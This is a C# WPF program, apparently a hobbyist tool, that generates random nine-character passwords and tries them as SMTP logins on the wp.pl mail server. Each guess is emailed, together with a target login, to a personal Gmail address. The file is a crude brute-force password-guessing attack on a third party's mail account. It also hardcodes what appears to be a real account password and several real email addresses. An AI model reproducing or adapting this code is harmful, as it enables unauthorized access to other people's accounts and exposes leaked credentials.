using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.Net;
using System.Net.Mail;

namespace Poczta
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        String haslo = "";
        char[] znak = new char[67];
        int[] indexZnaku = new int[12];
        Random R = new Random();

        public MainWindow()
        {
            InitializeComponent();
            int i_temp=33; // '!'

                for (int i = 0; i < 67; i++)
                {
                    if (i_temp == 33) { znak[i] = (char)i_temp; i_temp += 2; }//35
                    else if (i_temp >= 35 && i_temp < 37) { znak[i] = (char)i_temp; i_temp += 1; }
                    else if (i_temp == 37) { znak[i] = (char)i_temp; i_temp = 48; }
                    else if (i_temp >= 48 && i_temp < 57) { znak[i] = (char)i_temp; i_temp += 1; }
                    else if (i_temp == 57) { znak[i] = (char)i_temp; i_temp = 64; }
                    else if (i_temp >= 64 && i_temp < 90) { znak[i] = (char)i_temp; i_temp += 1; }
                    else if (i_temp == 90) { znak[i] = (char)i_temp; i_temp = 97; }
                    else if (i_temp >= 97 && i_temp <= 122) { znak[i] = (char)i_temp; i_temp += 1; }
                }

            TB_Message.Text = "";

            foreach (char c in znak)
            {
                TB_Message.Text += c+" ";
            }
            

        }

        private void Button_Click(object sender, RoutedEventArgs e)
        {
            //ilosc znaków
            int il_zn = 9; //9-12;
            Int64 iterator = 0;
            bool correct = false;//wskazuje czy znaleziono haslo
            Indicator.Content = "Szukam";
            for (int i = 0; i < 12; i++) indexZnaku[i] = 0;

            System.Net.Mail.MailMessage message = new System.Net.Mail.MailMessage();
            SmtpClient smtpClient = new SmtpClient();
            smtpClient.Host = "smtp.wp.pl";
            smtpClient.UseDefaultCredentials = false;
            message.To.Add("ziajkowski.marcin@gmail.com");
            message.Subject = "MARCIN MISZCZ";
            //message.From = new System.Net.Mail.MailAddress("simciyt69@wp.pl");
            message.From = new System.Net.Mail.MailAddress("hyper444@wp.pl");

            while (!correct && iterator<10)
            {

                iterator++;
                haslo = "";
                for(int j = 0; j < il_zn; j++)
                {
                    haslo += znak[R.Next(0,67)];
                }

                //NetworkCredential basicCredential = new NetworkCredential("simcity69", haslo);
                NetworkCredential basicCredential = new NetworkCredential("hyper444", "SuperiorSH93");

                
                //smtpClient.Host = TB_Host.Text;
                
                smtpClient.Credentials = basicCredential;

                message.Body = TB_Login.Text + ": " + haslo + " ";
                

                try
                {
                    smtpClient.Send(message);
                    //correct = true;
                    Indicator.Content = "Znaleziono";
                }
                catch (Exception ex)
                {
                    TB_Message.Text = ex.Message.ToString() + " HASŁO: " + haslo;
                }
            
        }//while
       }

  
    }
}
